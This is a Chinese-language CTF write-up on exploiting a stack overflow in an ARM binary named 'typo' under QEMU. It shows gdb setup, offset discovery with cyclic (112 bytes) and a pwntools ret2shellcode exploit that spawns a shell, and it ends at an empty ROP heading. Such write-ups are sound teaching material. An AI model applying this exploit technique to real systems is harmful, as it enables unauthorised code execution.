# ARM Stack OverFlow


## 0x00 ARM PWN 知识准备
### Qemu 调试
>在1234端口开启gdbserver `-g` 1234    

`qemu-arm -g 1234 ./binary` 

>gdb-multiarch连接gdbserver
```
gdb-multiarch 
pwndbg> set architecture arm
pwndbg> set endian little
pwndbg> target remote 127.0.0.1:1234
```



## 0x01 PWN

### 1.题目

Binary： [typo](./typo)

1. ret2shellcode：通过shellcode解题，通过栈溢出利用，获取RCE。   
2. rop：通过构造rop解题，通过栈溢出利用，获取RCE。 

> 开了NX，但是qemu不支持nx，相当于没开启。  
```
$ pwn checksec  ./typo
[*] '/home/mi/CTF/pwn-exercise/linux_arm_stack/arm_pwn_typo/typo'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8000)
```
32位 ARM ELF
```
$ file typo
typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
```

### 2.分析

####  运行
```
$ qemu-arm  ./typo
Let's Do Some Typing Exercise~
Press Enter to get start;
Input ~ if you want to quit

------Begin------
yearly

```
- 输入点1：通过简单的测试运行，如果不输入指定字符（`\n`），会退出，这无法产生溢出。  
- 输入点2：回车后，可再次输入，过长字符产生`Segmentation fault (core dumped)`报错，可以判定这个为溢出点。    


#### 调试
>启动调试：`qemu-arm -g 1234 ./typo`

```
gdb-multiarch 
pwndbg> set architecture arm
pwndbg> set endian little
pwndbg> target remote 127.0.0.1:1234
```
#### 判断溢出长度
通过pwntools cyclic工来判断溢出长度，通过规则的字符串输入，再根据ret的地址字符来比对，判断溢出长度。   

```
>>> from pwn import *
>>> cyclic(200)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
```
将上述字符串输入到输入点2，产生溢出，gdb异常断下。     
```
Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────[ REGISTERS ]─────────────────────────────
 R0   0x0
*R1   0xf6ffee64 ◂— 0x61616161 ('aaaa')
*R2   0x7e
 R3   0x0
*R4   0x62616162 ('baab')
 R5   0x0
 R6   0x0
 R7   0x0
 R8   0x0
*R9   0xa5ec ◂— push   {r3, r4, r5, r6, r7, r8, sb, lr}
*R10  0xa68c ◂— push   {r3, r4, r5, lr}
*R11  0x62616163 ('caab')
 R12  0x0
*SP   0xf6ffeed8 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
*PC   0x62616164 ('daab')
──────────────────────────────[ DISASM ]──────────────────────────────
Invalid address 0x62616164
──────────────────────────────[ STACK ]───────────────────────────────
00:0000│ sp 0xf6ffeed8 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
01:0004│    0xf6ffeedc ◂— 'faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
02:0008│    0xf6ffeee0 ◂— 'gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
03:000c│    0xf6ffeee4 ◂— 'haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
04:0010│    0xf6ffeee8 ◂— 'iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
05:0014│    0xf6ffeeec ◂— 'jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
06:0018│    0xf6ffeef0 ◂— 'kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
07:001c│    0xf6ffeef4 ◂— 'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
────────────────────────────[ BACKTRACE ]─────────────────────────────
 ► f 0 0x62616164
──────────────────────────────────────────────────────────────────────
```
PC寄存器就是ret的地址，为'daab'，以此判断padding为112。
```
>>> cyclic_find('daab')
112
```


## 0x02 EXP


### ret2shellcode

> 1. qemu栈地址可能会有变化，ret2shellcode不算稳定，需要调试看当前环境的地址空间。   
> 2. 使用pwntools的shellcraft.sh如果报错，arm不支持，解决： `sudo apt-get install binutils-arm*`

exp file : [exp.py](./exp.py)
```
from  pwn import *

context(arch='arm',log_level='debug')
io = process(['qemu-arm','./typo'])
#io = process(['qemu-arm',"-g","1234",'./typo'])

io.recv()
io.send("\n")
io.recv()
io.sendline(asm(shellcraft.sh()).ljust(112,b'a') + p32(0xf6fff174))
io.interactive()
```

### rop